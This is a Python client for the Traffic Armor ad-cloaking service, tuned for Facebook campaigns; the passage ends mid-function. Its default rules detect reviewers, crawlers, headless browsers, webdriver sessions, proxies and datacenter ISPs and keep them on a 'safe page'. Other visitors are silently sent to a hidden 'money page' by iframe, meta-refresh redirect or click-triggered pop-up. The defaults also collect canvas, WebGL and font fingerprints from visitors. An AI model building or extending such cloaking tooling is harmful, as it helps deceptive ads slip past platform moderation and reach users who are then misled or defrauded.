"""Traffic Armor API client — full implementation of all TA endpoints."""

import httpx
from app.core.config import settings

BASE_URL = "https://api.trafficarmor.com"

# ── Smart defaults for Facebook cloaking (17+ TA-recommended settings) ────────
# These are applied when creating a campaign unless the user overrides them.
# Based on Traffic Armor's official FB best practices.
DEFAULT_RULES = {
    # === ALWAYS ON (TA recommended for FB) ===
    "proxy_detection": True,                  # 17. Proxy Detection
    "sticky_cloaking": True,                  # 5. Sticky Filtering (campaign + cross-user)
    "timezone_discrepancy": True,             # 6. Timezone Discrepancy (Hybrid/JS)
    "cloak_uncommon_isps": True,              # 2. Filter Uncommon ISPs
    "cloak_blacklisted_ptrs": True,           # 2. Filter Commercial ISPs
    "feature_tests": {"enabled": True, "headless_browser": True},  # 11. Headless Browsers
    "isp_type": {"enabled": True, "disallow": ["DCH", "SES"]},    # 10. ISP Type defaults
    "global_databases": {"enabled": True, "disallow": [], "filter_assoc_cities": True},  # 8. ALL global databases
    "browser_switching": {"enabled": True, "threshold": 60},       # 9. Browser Switching 60min
    "pass_full_query_strings": True,
    "traffic_pattern": {"enabled": True, "google": False},         # 16. Traffic Pattern ON
    # 3. Maximum Visits — Cookies=1, IP=1
    "maximum_visits": {"enabled": True, "by_ip": 1, "by_cookie": 1},
    # 4. Cross-Campaign Visits — Cookies=1
    "cross_campaign_visits": {"enabled": True, "by_ip": False, "by_cookie": 1},
    # 12. Spoofed Devices — all options
    "spoofed_devices": {"enabled": True},
    # 13. Browser Language — disallow location mismatch
    "browser_language": {"enabled": True},
    # 14. Filter Uncommon Browsers — all options
    "uncommon_browsers": {"enabled": True},
    # 15. Filter Outdated Browsers — <2 versions old
    "outdated_browsers": {"enabled": True, "versions": 2},
    # === FB-specific additions ===
    # URL Contains: Allow Only fbclid + Filter Blank/Invalid Subids
    "url_contains": {"enabled": True, "require": "fbclid", "filter_blank_subids": True},
    # Block Duplicate URLs: ON (fbclid uniqueness)
    "block_duplicate_urls": True,
    # Other JS Tests (FB-specific thresholds)
    "js_tests": {
        "enabled": True,
        "hardware_concurrency_max": 8,
        "device_memory_max": 16,
        "cookie_enabled": True,
        "webdriver_disallow": True,
        "history_length_max": 1,
    },
    # Data gathering for fingerprint analysis
    "data_gathering": {
        "screen_resolution": True,
        "fonts": True,
        "webgl": True,
        "canvas": True,
    },
    # === Configurable per-campaign ===
    "location": {"enabled": False, "allow": [], "disallow": []},  # 1. User sets target GEO
    "devices": {"enabled": False, "disallow": []},                 # 7. User sets device filter
    "touch_devices": {"enabled": False},                           # Mobile-only campaigns
    "google_click_id": {"enabled": False, "valid": False},
    # === Optional toggles (OFF by default) ===
    "deadbolt": False,
    "consent_prompt": False,
}


def _api_key():
    key = settings.TRAFFIC_ARMOR_API_KEY
    if not key:
        raise ValueError("TRAFFIC_ARMOR_API_KEY not configured")
    return key


def build_ta_form_data(name: str, money_page_url: str, safe_url: str,
                       rules: dict = None, integration_method: str = "JavaScript",
                       hybrid_mode: bool = True,
                       consent_prompt: bool = False,
                       delivery_method: str = "iframe") -> dict:
    """Convert our rules JSON into Traffic Armor's form-data format.

    integration_method: "JavaScript" (self-hosted, recommended), "PHP", "WordPress"
    delivery_method: "iframe" (default), "custom_js" (consent prompt), "paste_html"
    consent_prompt: legacy flag — if True, overrides delivery_method to custom_js.
    """
    r = {**DEFAULT_RULES, **(rules or {})}
    # Resolve delivery method: consent_prompt flag overrides to custom_js for backwards compat
    method = delivery_method or "iframe"
    if consent_prompt or r.get("consent_prompt", False):
        method = "custom_js"

    # Extract domain from safe_url for js_hosted_domain
    safe_domain = safe_url.replace("https://", "").replace("http://", "").rstrip("/")

    fd = {
        "campaign[name]": name,
        "campaign[rules][0][safe_mode]": "1",  # Deadbolt ON (omit this key to turn OFF)
        "campaign[rules][0][disallow_visitors][remain_on_safe_page]": "1",
        "campaign[integration_method]": integration_method,
        "campaign[fail_url]": safe_url,                    # Where blocked visitors stay
        "campaign[js_hosted_domain]": safe_domain,         # Domain hosting TA's JS
    }

    # Allowed visitor action
    if method == "custom_js":
        # Consent prompt: any click opens money page in new tab
        fd["campaign[rules][0][allow_visitors][method]"] = "custom_js"
        fd["campaign[rules][0][allowed_visitor_custom_js]"] = (
            f"document.addEventListener('click',function(){{window.open('{money_page_url}','_blank')}});"
        )
    elif method == "paste_html":
        # Paste HTML: TA replaces page with custom HTML for allowed visitors
        fd["campaign[rules][0][allow_visitors][method]"] = "paste_html"
        # HTML content with meta refresh redirect to money page
        fd["campaign[rules][0][allowed_visitor_paste_html]"] = (
            f'<html><head><meta http-equiv="refresh" content="0;url={money_page_url}"></head>'
            f'<body style="margin:0;padding:0;background:#fff;"></body></html>'
        )
    else:
        # Default: iframe method (TA recommended for tracking links)
        fd["campaign[rules][0][allow_visitors][method]"] = "iframe"
        fd["campaign[rules][0][allow_visitors][urls][0]"] = money_page_url

    if hybrid_mode:
        fd["campaign[hybrid_mode]"] = "1"

    # Simple toggles
    for key in ("timezone_discrepancy", "cloak_blacklisted_ptrs"):
        if r.get(key):
            fd[f"campaign[rules][0][{key}]"] = "1"

    # Filter Uncommon ISPs + child: Also Filter Commercial ISPs
    if r.get("cloak_uncommon_isps"):
        fd["campaign[rules][0][cloak_uncommon_isps]"] = "1"
        fd["campaign[rules][0][cloak_uncommon_isps][cloak_commercial_isps]"] = "1"

    # Sticky cloaking — requires children (per TA dev + postdata)
    if r.get("sticky_cloaking"):
        fd["campaign[rules][0][sticky_cloaking]"] = "1"
        fd["campaign[rules][0][sticky_cloaking][campaign_level]"] = "1"
        fd["campaign[rules][0][sticky_cloaking][across_all_users]"] = "1"
        fd["campaign[rules][0][sticky_cloaking][across_all_users_range]"] = "0"
        fd["campaign[rules][0][sticky_cloaking][across_all_users_time_range_days]"] = "30"
        fd["campaign[rules][0][sticky_cloaking][across_all_users_campaign]"] = "1"
        fd["campaign[rules][0][sticky_cloaking][across_all_users_campaign_range]"] = "0"
        fd["campaign[rules][0][sticky_cloaking][across_all_users_campaign_time_range_days]"] = "30"

    # Spoofed Devices — children: browsers, os, mobile
    sd = r.get("spoofed_devices", {})
    if isinstance(sd, dict) and sd.get("enabled"):
        fd["campaign[rules][0][spoofed_devices]"] = "1"
        fd["campaign[rules][0][spoofed_devices][browsers]"] = "1"
        fd["campaign[rules][0][spoofed_devices][os]"] = "1"
        fd["campaign[rules][0][spoofed_devices][mobile]"] = "1"

    # Proxy detection
    if r.get("proxy_detection"):
        fd["campaign[rules][0][proxy_detection]"] = "1"
        fd["campaign[rules][0][proxy_detection_version_opt]"] = "0"
        fd["campaign[rules][0][proxy_detection_version]"] = "1"

    # Pass full query strings (for FB macros / fbclid)
    if r.get("pass_full_query_strings"):
        fd["campaign[rules][0][pass_full_query_strings]"] = "2"

    # Location filtering
    loc = r.get("location", {})
    if isinstance(loc, dict) and loc.get("enabled"):
        fd["campaign[rules][0][location]"] = "1"
        for i, lid in enumerate(loc.get("allow", [])):
            fd[f"campaign[rules][0][location][allow][list][{i}]"] = str(lid)
        for i, lid in enumerate(loc.get("disallow", [])):
            fd[f"campaign[rules][0][location][disallow][list][{i}]"] = str(lid)

    # Devices
    dev = r.get("devices", {})
    if isinstance(dev, dict) and dev.get("enabled"):
        fd["campaign[rules][0][devices]"] = "1"
        for i, d in enumerate(dev.get("disallow", [])):
            fd[f"campaign[rules][0][devices][disallow][list][{i}]"] = d

    # Touch devices only (mobile-only campaigns)
    td = r.get("touch_devices", {})
    if isinstance(td, dict) and td.get("enabled"):
        fd["campaign[rules][0][touch_devices]"] = "1"

    # Global databases
    gdb = r.get("global_databases", {})
    if isinstance(gdb, dict) and gdb.get("enabled"):
        fd["campaign[rules][0][global_databases]"] = "1"
        for i, gid in enumerate(gdb.get("disallow", [])):
            fd[f"campaign[rules][0][global_databases][disallow][list][{i}]"] = str(gid)
        if gdb.get("filter_assoc_cities"):
            fd["campaign[rules][0][global_databases][filter_assoc_cities]"] = "1"

    # Browser switching
    bs = r.get("browser_switching", {})
    if isinstance(bs, dict) and bs.get("enabled"):
        fd["campaign[rules][0][browser_switching]"] = "1"
        fd["campaign[rules][0][browser_switching][text]"] = str(bs.get("threshold", 60))

    # ISP type
    isp = r.get("isp_type", {})
    if isinstance(isp, dict) and isp.get("enabled"):
        fd["campaign[rules][0][isp_type]"] = "1"
        for i, code in enumerate(isp.get("disallow", [])):
            fd[f"campaign[rules][0][isp_type][disallow][list][{i}]"] = code

    # Feature tests
    ft = r.get("feature_tests", {})
    if isinstance(ft, dict) and ft.get("enabled"):
        fd["campaign[rules][0][feature_tests]"] = "1"
        if ft.get("headless_browser"):
            fd["campaign[rules][0][feature_tests][headless_browser]"] = "1"

    # Google click ID
    gci = r.get("google_click_id", {})
    if isinstance(gci, dict) and gci.get("enabled"):
        fd["campaign[rules][0][google_click_id]"] = "1"
        if gci.get("valid"):
            fd["campaign[rules][0][google_click_id][valid]"] = "1"

    # Traffic pattern
    tp = r.get("traffic_pattern", {})
    if isinstance(tp, dict) and tp.get("enabled"):
        fd["campaign[rules][0][traffic_pattern]"] = "1"
        if tp.get("google"):
            fd["campaign[rules][0][traffic_pattern][google]"] = "1"

    # Maximum visits — by_ip and by_cookie values are the count directly (per TA API docs)
    mv = r.get("maximum_visits", {})
    if isinstance(mv, dict) and mv.get("enabled"):
        fd["campaign[rules][0][maximum_visits]"] = "1"
        by_ip = mv.get("by_ip")
        by_cookie = mv.get("by_cookie")
        if by_ip:
            fd["campaign[rules][0][maximum_visits][by_ip]"] = str(by_ip) if isinstance(by_ip, int) else "1"
        if by_cookie:
            fd["campaign[rules][0][maximum_visits][by_cookie]"] = str(by_cookie) if isinstance(by_cookie, int) else "1"

    # Cross-campaign visits — same format as maximum_visits
    ccv = r.get("cross_campaign_visits", {})
    if isinstance(ccv, dict) and ccv.get("enabled"):
        fd["campaign[rules][0][cross_campaign_visits]"] = "1"
        by_ip = ccv.get("by_ip")
        by_cookie = ccv.get("by_cookie")
        if by_ip:
            fd["campaign[rules][0][cross_campaign_visits][by_ip]"] = str(by_ip) if isinstance(by_ip, int) else "1"
        if by_cookie:
            fd["campaign[rules][0][cross_campaign_visits][by_cookie]"] = str(by_cookie) if isinstance(by_cookie, int) else "1"

    # ── New FB-specific rules ────────────────────────────────────────────────

    # Browser Language — disallow location mismatch
    bl = r.get("browser_language", {})
    if isinstance(bl, dict) and bl.get("enabled"):
        fd["campaign[rules][0][browser_language]"] = "1"

    # Filter Uncommon Browsers — all options
    ub = r.get("uncommon_browsers", {})
    if isinstance(ub, dict) and ub.get("enabled"):
        fd["campaign[rules][0][uncommon_browsers]"] = "1"

    # Filter Outdated Browsers — versions threshold
    ob = r.get("outdated_browsers", {})
    if isinstance(ob, dict) and ob.get("enabled"):
        fd["campaign[rules][0][outdated_browsers]"] = "1"
        fd["campaign[rules][0][outdated_browsers][versions]"] = str(ob.get("versions", 2))

    # URL Contains — require fbclid for FB campaigns
    uc = r.get("url_contains", {})
    if isinstance(uc, dict) and uc.get("enabled"):
        fd["campaign[rules][0][url_contains]"] = "1"
        if uc.get("require"):
            fd["campaign[rules][0][url_contains][require]"] = uc["require"]
        if uc.get("filter_blank_subids"):
            fd["campaign[rules][0][url_contains][filter_blank_subids]"] = "1"

    # Block Duplicate URLs (fbclid uniqueness)
    if r.get("block_duplicate_urls"):
        fd["campaign[rules][0][block_duplicate_urls]"] = "1"

    # Other JS Tests (FB-specific)
    jt = r.get("js_tests", {})
    if isinstance(jt, dict) and jt.get("enabled"):
        fd["campaign[rules][0][js_tests]"] = "1"
        if jt.get("hardware_concurrency_max"):
            fd["campaign[rules][0][js_tests][hardware_concurrency]"] = str(jt["hardware_concurrency_max"])
        if jt.get("device_memory_max"):
            fd["campaign[rules][0][js_tests][device_memory]"] = str(jt["device_memory_max"])
        if jt.get("cookie_enabled"):
            fd["campaign[rules][0][js_tests][cookie_enabled]"] = "1"
        if jt.get("webdriver_disallow"):
            fd["campaign[rules][0][js_tests][webdriver]"] = "0"
        if jt.get("history_length_max"):
            fd["campaign[rules][0][js_tests][history_length]"] = str(jt["history_length_max"])

    # Data gathering (fingerprint analysis)
    dg = r.get("data_gathering", {})
    if isinstance(dg, dict):
        for field in ("screen_resolution", "fonts", "webgl", "canvas"):
            if dg.get(field):
                fd[f"campaign[rules][0][data_gathering][{field}]"] = "1"

    return fd


def build_ta_form_data_v2(name: str, money_page_url: str, safe_url: str,
                          rules: dict = None, integration_method: str = "JavaScript",
                          hybrid_mode: bool = True, consent_prompt: bool = False,
                          delivery_method: str = "iframe") -> dict:
    """Build multipart form-data using v2 rules[0] format (per TA API docs).

    CRITICAL: Must be sent as multipart/form-data, NOT application/x-www-form-urlencoded.
    TA silently drops fields when sent as urlencoded.
    """
    r = {**DEFAULT_RULES, **(rules or {})}
    method = delivery_method or "iframe"
    if consent_prompt or r.get("consent_prompt", False):
        method = "custom_js"
    R = "campaign[rules][0]"  # prefix shortcut

    fd = {
        "campaign[name]": name,
        "campaign[integration_method]": integration_method,
        "campaign[hybrid_mode]": "1" if hybrid_mode else "0",
    }

    # ── Allowed visitor action ────────────────────────────────────────────────
    if method == "custom_js":
        fd[f"{R}[allow_visitors][method]"] = "custom_js"
        fd[f"{R}[allowed_visitor_custom_js]"] = (
            f"document.addEventListener('click',function(){{window.open('{money_page_url}','_blank')}});"
        )
    elif method == "paste_html":
        fd[f"{R}[allow_visitors][method]"] = "paste_html"
        fd[f"{R}[allowed_visitor_paste_html]"] = (
            f'<html><head><meta http-equiv="refresh" content="0;url={money_page_url}"></head>'
            f'<body style="margin:0;padding:0;background:#fff;"></body></html>'
        )
    else:
        fd[f"{R}[allow_visitors][method]"] = "iframe"
        fd[f"{R}[allow_visitors][urls][0]"] = money_page_url

    # Disallowed visitors — remain on safe page
    fd[f"{R}[disallow_visitors][remain_on_safe_page]"] = "1"

    # Safe mode = deadbolt (TA API field name is safe_mode, NOT deadbolt)
    # TA booleans use presence=ON, absence=OFF. Do NOT send safe_mode=0.
    if r.get("deadbolt"):
        fd[f"{R}[safe_mode]"] = "1"

    # ── Cloaking rules (v2 rules[0] field names from TA API docs) ─────────────
    # Sticky cloaking — requires children (per TA dev + postdata)
    if r.get("sticky_cloaking"):
        fd[f"{R}[sticky_cloaking]"] = "1"
        fd[f"{R}[sticky_cloaking][campaign_level]"] = "1"
        fd[f"{R}[sticky_cloaking][across_all_users]"] = "1"
        fd[f"{R}[sticky_cloaking][across_all_users_range]"] = "0"
        fd[f"{R}[sticky_cloaking][across_all_users_time_range_days]"] = "30"
        fd[f"{R}[sticky_cloaking][across_all_users_campaign]"] = "1"
        fd[f"{R}[sticky_cloaking][across_all_users_campaign_range]"] = "0"
        fd[f"{R}[sticky_cloaking][across_all_users_campaign_time_range_days]"] = "30"
    # Filter Uncommon ISPs + child: Also Filter Commercial ISPs
    if r.get("cloak_uncommon_isps"):
        fd[f"{R}[cloak_uncommon_isps]"] = "1"
        fd[f"{R}[cloak_uncommon_isps][cloak_commercial_isps]"] = "1"
    if r.get("cloak_blacklisted_ptrs"):
        fd[f"{R}[cloak_blacklisted_ptrs]"] = "1"
    if r.get("timezone_discrepancy"):
        fd[f"{R}[timezone_discrepancy]"] = "1"

    # Proxy detection (requires 3 fields per TA docs)
    if r.get("proxy_detection"):
        fd[f"{R}[proxy_detection]"] = "1"
        fd[f"{R}[proxy_detection_version]"] = "1"
        fd[f"{R}[proxy_detection_version_opt]"] = "0"

    # Feature tests
    ft = r.get("feature_tests", {})
    if isinstance(ft, dict):
        if ft.get("enabled") or ft.get("headless_browser"):
            fd[f"{R}[feature_tests]"] = "1"
        if ft.get("headless_browser"):
            fd[f"{R}[feature_tests][headless_browser]"] = "1"

    # Global databases
    gdb = r.get("global_databases", {})
    if isinstance(gdb, dict) and gdb.get("enabled"):
        fd[f"{R}[global_databases]"] = "1"
        fd[f"{R}[global_databases][filter_assoc_cities]"] = "1"

    # ISP type filtering
    isp = r.get("isp_type", {})
    if isinstance(isp, dict) and isp.get("enabled"):
        fd[f"{R}[isp_type]"] = "1"
        # Note: duplicate keys for list[] — handled via _multipart_items()

    # Browser switching
    bs = r.get("browser_switching", {})
    if isinstance(bs, dict) and bs.get("enabled"):
        fd[f"{R}[browser_switching]"] = "1"
        fd[f"{R}[browser_switching][text]"] = str(bs.get("threshold", 60))

    # Maximum visits
    mv = r.get("maximum_visits", {})
    if isinstance(mv, dict) and mv.get("enabled"):
        fd[f"{R}[maximum_visits]"] = "1"
        if mv.get("by_ip"):
            fd[f"{R}[maximum_visits][by_ip]"] = str(mv["by_ip"])
        if mv.get("by_cookie"):
            fd[f"{R}[maximum_visits][by_cookie]"] = str(mv["by_cookie"])

    # Cross-campaign visits
    ccv = r.get("cross_campaign_visits", {})
    if isinstance(ccv, dict) and ccv.get("enabled"):
        fd[f"{R}[cross_campaign_visits]"] = "1"
        if ccv.get("by_ip"):
            fd[f"{R}[cross_campaign_visits][by_ip]"] = str(ccv["by_ip"])
        if ccv.get("by_cookie"):
            fd[f"{R}[cross_campaign_visits][by_cookie]"] = str(ccv["by_cookie"])

    # Traffic pattern
    tp = r.get("traffic_pattern", {})
    if isinstance(tp, dict) and tp.get("enabled"):
        fd[f"{R}[traffic_pattern]"] = "1"
        if tp.get("google"):
            fd[f"{R}[traffic_pattern][google]"] = "1"

    # Google click ID
    gcid = r.get("google_click_id", {})
    if isinstance(gcid, dict) and gcid.get("enabled"):
        fd[f"{R}[google_click_id]"] = "1"
        if gcid.get("valid"):
            fd[f"{R}[google_click_id][valid]"] = "1"

    # Devices
    dev = r.get("devices", {})
    if isinstance(dev, dict) and dev.get("enabled"):
        fd[f"{R}[devices]"] = "1"

    # Spoofed Devices — children: browsers, os, mobile
    sd = r.get("spoofed_devices", {})
    if isinstance(sd, dict) and sd.get("enabled"):
        fd[f"{R}[spoofed_devices]"] = "1"
        fd[f"{R}[spoofed_devices][browsers]"] = "1"
        fd[f"{R}[spoofed_devices][os]"] = "1"
        fd[f"{R}[spoofed_devices][mobile]"] = "1"

    # Pass full query strings (2 = pass all)
    if r.get("pass_full_query_strings"):
        fd[f"{R}[pass_full_query_strings]"] = "2"

    # Location filtering
    loc = r.get("location", {})
    if isinstance(loc, dict) and loc.get("enabled"):
        fd[f"{R}[location]"] = "1"

    # ── FB-specific rules ──────────────────────────────────────────────────

    # Browser Language — disallow location mismatch
    bl = r.get("browser_language", {})
    if isinstance(bl, dict) and bl.get("enabled"):
        fd[f"{R}[browser_language]"] = "1"

    # Filter Uncommon Browsers
    ub = r.get("uncommon_browsers", {})
    if isinstance(ub, dict) and ub.get("enabled"):
        fd[f"{R}[uncommon_browsers]"] = "1"

    # Filter Outdated Browsers
    ob = r.get("outdated_browsers", {})
    if isinstance(ob, dict) and ob.get("enabled"):
        fd[f"{R}[outdated_browsers]"] = "1"
        fd[f"{R}[outdated_browsers][versions]"] = str(ob.get("versions", 2))

    # URL Contains — require fbclid for FB campaigns
    uc = r.get("url_contains", {})
    if isinstance(uc, dict) and uc.get("enabled"):
        fd[f"{R}[url_contains]"] = "1"
        if uc.get("require"):
            fd[f"{R}[url_contains][require]"] = uc["require"]
        if uc.get("filter_blank_subids"):
            fd[f"{R}[url_contains][filter_blank_subids]"] = "1"

    # Block Duplicate URLs (fbclid uniqueness)
    if r.get("block_duplicate_urls"):
        fd[f"{R}[block_duplicate_urls]"] = "1"

    # Other JS Tests (FB-specific)
    jt = r.get("js_tests", {})
    if isinstance(jt, dict) and jt.get("enabled"):
        fd[f"{R}[js_tests]"] = "1"
        if jt.get("hardware_concurrency_max"):
            fd[f"{R}[js_tests][hardware_concurrency]"] = str(jt["hardware_concurrency_max"])
        if jt.get("device_memory_max"):
            fd[f"{R}[js_tests][device_memory]"] = str(jt["device_memory_max"])
        if jt.get("cookie_enabled"):
            fd[f"{R}[js_tests][cookie_enabled]"] = "1"
        if jt.get("webdriver_disallow"):
            fd[f"{R}[js_tests][webdriver]"] = "0"
        if jt.get("history_length_max"):
            fd[f"{R}[js_tests][history_length]"] = str(jt["history_length_max"])

    # Data gathering (fingerprint analysis)
    dg = r.get("data_gathering", {})
    if isinstance(dg, dict):
        for field in ("screen_resolution", "fonts", "webgl", "canvas"):
            if dg.get(field):
                fd[f"campaign[rules][0][data_gathering][{field}]"] = "1"

    return fd


def _multipart_items(form_data: dict, rules: dict = None) -> list:
    """Convert form_data dict to list of (key, value) tuples for multipart upload.

    Handles list fields (ISP types, locations, devices, global DBs) that need
    duplicate keys with [] suffix (PHP array notation).
    """
    items = [(k, v) for k, v in form_data.items()]
    r = rules or {}
    R = "campaign[rules][0]"

    # ISP type disallow list (duplicate keys)
    isp = r.get("isp_type", {})
    if isinstance(isp, dict) and isp.get("enabled"):
        for code in isp.get("disallow", []):
            items.append((f"{R}[isp_type][disallow][list][]", code))

    # Location allow/disallow lists
    loc = r.get("location", {})
    if isinstance(loc, dict) and loc.get("enabled"):
        for lid in loc.get("allow", []):
            items.append((f"{R}[location][allow][list][]", str(lid)))
        for lid in loc.get("disallow", []):
            items.append((f"{R}[location][disallow][list][]", str(lid)))

    # Device disallow list
    dev = r.get("devices", {})
    if isinstance(dev, dict) and dev.get("enabled"):
        for d in dev.get("disallow", []):
            items.append((f"{R}[devices][disallow][list][]", d.capitalize()))

    # Global databases disallow list
    gdb = r.get("global_databases", {})
    if isinstance(gdb, dict) and gdb.get("enabled"):
        for db_id in gdb.get("disallow", []):
            items.append((f"{R}[global_databases][disallow][list][]", str(db_id)))

    return items


# Keep old name as alias for backward compatibility
def build_ta_form_data_v1(*args, **kwargs):
    return build_ta_form_data_v2(*args, **kwargs)


# ── Campaign CRUD ────────────────────────────────────────────────────────────

async def create_campaign(form_data: dict, rules: dict = None) -> dict:
    """Create a new TA campaign via v2 endpoint with multipart form-data."""
    items = _multipart_items(form_data, rules)
    async with httpx.AsyncClient(timeout=30) as client:
        resp = await client.post(
            f"{BASE_URL}/campaigns_v2/create",
            params={"api_key": _api_key()},
            files=[(k, (None, v)) for k, v in items],
        )
        resp.raise_for_status()
        return resp.json()


async def create_campaign_v2(form_data: dict) -> dict:
    """Alias for create_campaign."""
    return await create_campaign(form_data)


async def edit_campaign(campaign_number: int, form_data: dict, rules: dict = None) -> dict:
    """Edit a TA campaign via v2 endpoint.

    TA's edit endpoint requires:
    1. First GET the full campaign_postdata (to avoid wiping fields)
    2. Merge our changes into the existing postdata
    3. PUT with Content-Type: text/plain and URL-encoded body

    Uses list-of-tuples (not dict) to preserve duplicate keys like
    isp_type[disallow][list][] which need multiple values (PHP array notation).
    """
    from urllib.parse import unquote_plus

    async with httpx.AsyncClient(timeout=30) as client:
        # Step 1: Get existing postdata so we don't wipe other fields
        existing_resp = await client.get(
            f"{BASE_URL}/campaign_postdata/{campaign_number}",
            params={"api_key": _api_key()},
        )
        existing_body = existing_resp.text if existing_resp.status_code == 200 else ""

        # Parse into list of tuples (preserves duplicate keys like list[])
        existing_pairs = []
        if existing_body:
            for pair in existing_body.split("&"):
                if "=" in pair and pair.strip():
                    k, v = pair.split("=", 1)
                    k = unquote_plus(k.strip())
                    v = unquote_plus(v.strip())
                    if k:  # Skip empty keys (TA bug: returns stray "=PHP")
                        existing_pairs.append((k, v))

        # Step 2: Build our new items (includes both dict keys and list[] keys)
        our_items = _multipart_items(form_data, rules)
        our_keys = set(k for k, v in our_items)

        # Step 2b: Filter existing — remove any keys we're replacing
        filtered = [(k, v) for k, v in existing_pairs if k not in our_keys]

        # Step 2c: TA booleans use presence=ON, absence=OFF.
        # If safe_mode is not in our form_data, remove it (deadbolt OFF).
        R = "campaign[rules][0]"
        if f"{R}[safe_mode]" not in form_data:
            filtered = [(k, v) for k, v in filtered if k != f"{R}[safe_mode]"]

        # Step 3: Combine existing (filtered) + our new items
        final_pairs = filtered + our_items

        # Step 4: PUT with text/plain (TA requirement for edit)
        body = "&".join(f"{k}={v}" for k, v in final_pairs)
        resp = await client.put(
            f"{BASE_URL}/campaigns_v2/{campaign_number}",
            params={"api_key": _api_key()},
            content=body,
            headers={"Content-Type": "text/plain"},
        )
        resp.raise_for_status()
        return resp.json()


async def edit_campaign_v1(campaign_number: int, form_data: dict) -> dict:
    """Alias for edit_campaign."""
    return await edit_campaign(campaign_number, form_data)


async def list_campaigns() -> list:
    """List all campaigns."""
    async with httpx.AsyncClient(timeout=30) as client:
        resp = await client.get(
            f"{BASE_URL}/campaigns",
            params={"api_key": _api_key()},
        )
        resp.raise_for_status()
        return resp.json()


async def list_active_campaigns() -> list:
    """List only active campaigns."""
    async with httpx.AsyncClient(timeout=30) as client:
        resp = await client.get(
            f"{BASE_URL}/active_campaigns",
            params={"api_key": _api_key()},
        )
        resp.raise_for_status()
        return resp.json()


async def get_campaign(campaign_id: str) -> dict:
    """Get campaign details by ID or number."""
    async with httpx.AsyncClient(timeout=30) as client:
        resp = await client.get(
            f"{BASE_URL}/campaigns_v2/{campaign_id}",
            params={"api_key": _api_key()},
        )
        resp.raise_for_status()
        return resp.json()


async def get_campaign_postdata(campaign_number: int) -> dict:
    """Get campaign form-data / full config including location data."""
    async with httpx.AsyncClient(timeout=30) as client:
        resp = await client.get(
            f"{BASE_URL}/campaign_postdata/{campaign_number}",
            params={"api_key": _api_key()},
        )
        resp.raise_for_status()
        return resp.json()


async def archive_campaigns(campaign_ids: list[int]) -> dict:
    """Archive one or more campaigns."""
    params = {"api_key": _api_key()}
    data = {f"campaigns[{i}]": cid for i, cid in enumerate(campaign_ids)}
    async with httpx.AsyncClient(timeout=30) as client:
        resp = await client.put(
            f"{BASE_URL}/update_campaigns/archive",
            params=params,
            data=data,
        )
        resp.raise_for_status()
        return resp.json()


async def check_proxy_domain(campaign_id: int, domain: str) -> dict:
    """Update the domain for proxy detection after campaign creation."""
    async with httpx.AsyncClient(timeout=30) as client:
        resp = await client.put(
            f"{BASE_URL}/do_check_proxy_domain",
            params={"api_key": _api_key()},
            data={"campaign_id": campaign_id, "domain": domain},
        )
        resp.raise_for_status()
        return resp.json()


# ── Click Logs & Stats ───────────────────────────────────────────────────────

def _normalize_click(click) -> dict:
    """Normalize TA click log field names to match frontend expectations."""
    if not isinstance(click, dict):
        return {"raw": str(click)}
    return {
        **click,
        # Time
        "created_at": click.get("visited") or click.get("created_at"),
        # Status — empty cloak_reason means allowed
        "allowed": not bool(click.get("cloak_reason")),
        # IP
        "ip_address": click.get("ip") or click.get("ip_address"),
        "ip": click.get("ip"),
        # Location
        "location_label": ", ".join(filter(None, [
            click.get("city_name"), click.get("region_name"), click.get("country_name"),
        ])),
        "country": click.get("country_name"),
        # ISP/Org
        "isp_name": click.get("org") or click.get("isp_name"),
        "org_name": click.get("org") or click.get("org_name"),
        # Agent
        "user_agent": click.get("agent") or click.get("user_agent"),
        # Campaign
        "campaign_label": click.get("label") or click.get("campaign_label"),
        # Visitor
        "visitor_id": click.get("browser_id") or click.get("visitor_id"),
        # URLs
        "url": click.get("lp_url") or click.get("url"),
    }


async def get_click_logs(
    campaign: int = None, daterange: str = None, page: int = None,
    cloak_reason: str = None, isp: int = None, ip: str = None,
    visitor_id: str = None, device: str = None, ip_address: str = None,
    location: int = None, agent_contains: str = None,
    safe_url_contains: str = None, destination_url_contains: str = None,
    referrer_contains: str = None,
    all_campaign_numbers: list = None,
) -> dict:
    """Get click logs with full filter support.

    If no campaign is specified and all_campaign_numbers is provided,
    fetches clicks across all campaigns (TA API requires campaign param).
    """
    filter_params = {
        "cloak_reason": cloak_reason, "isp": isp, "ip": ip,
        "visitor_id": visitor_id, "device": device, "ip_address": ip_address,
        "location": location, "agent_contains": agent_contains,
        "safe_url_contains": safe_url_contains,
        "destination_url_contains": destination_url_contains,
        "referrer_contains": referrer_contains,
    }

    async def _fetch_clicks(camp_num=None, pg=None):
        params = {"api_key": _api_key()}
        if camp_num is not None:
            params["campaign"] = camp_num
        if daterange is not None:
            params["daterange"] = daterange
        if pg is not None:
            params["page"] = pg
        for k, v in filter_params.items():
            if v is not None:
                params[k] = v
        async with httpx.AsyncClient(timeout=30) as client:
            resp = await client.get(f"{BASE_URL}/clicks", params=params)
            resp.raise_for_status()
            return resp.json()

    # If a specific campaign is requested, fetch directly
    if campaign is not None:
        result = await _fetch_clicks(campaign, page)
        clicks = result.get("data", [])
        return {"success": True, "data": [_normalize_click(c) for c in clicks]}

    # No campaign filter — fetch across all campaigns
    if all_campaign_numbers:
        import asyncio
        all_clicks = []
        for i, cn in enumerate(all_campaign_numbers):
            try:
                if i > 0:
                    await asyncio.sleep(0.2)  # Rate limit protection
                result = await _fetch_clicks(cn, page)
                data = result.get("data", []) if isinstance(result, dict) else []
                # TA returns ["error"] for archived campaigns — skip non-dict items
                all_clicks.extend(c for c in data if isinstance(c, dict))
            except Exception:
                pass
        # Sort by time descending
        all_clicks.sort(key=lambda c: c.get("visited", ""), reverse=True)
        return {"success": True, "data": [_normalize_click(c) for c in all_clicks]}

    # Fallback: try without campaign param (may return empty)
    result = await _fetch_clicks(None, page)
    clicks = result.get("data", [])
    return {"success": True, "data": [_normalize_click(c) for c in clicks]}


async def get_global_stats(daterange: str = None) -> dict:
    """Get global stats across all campaigns."""
    params = {"api_key": _api_key()}
    if daterange:
        params["daterange"] = daterange
    async with httpx.AsyncClient(timeout=30) as client:
        resp = await client.get(f"{BASE_URL}/stats", params=params)
        resp.raise_for_status()
        return resp.json()


async def get_stats(campaign_number: int, daterange: str = None) -> dict:
    """Get campaign-specific stats."""
    params = {"api_key": _api_key()}
    if daterange:
        params["daterange"] = daterange
    async with httpx.AsyncClient(timeout=30) as client:
        resp = await client.get(
            f"{BASE_URL}/stats/{campaign_number}", params=params,
        )
        resp.raise_for_status()
        return resp.json()


async def get_clicks_balance() -> dict:
    """Get account clicks balance."""
    async with httpx.AsyncClient(timeout=30) as client:
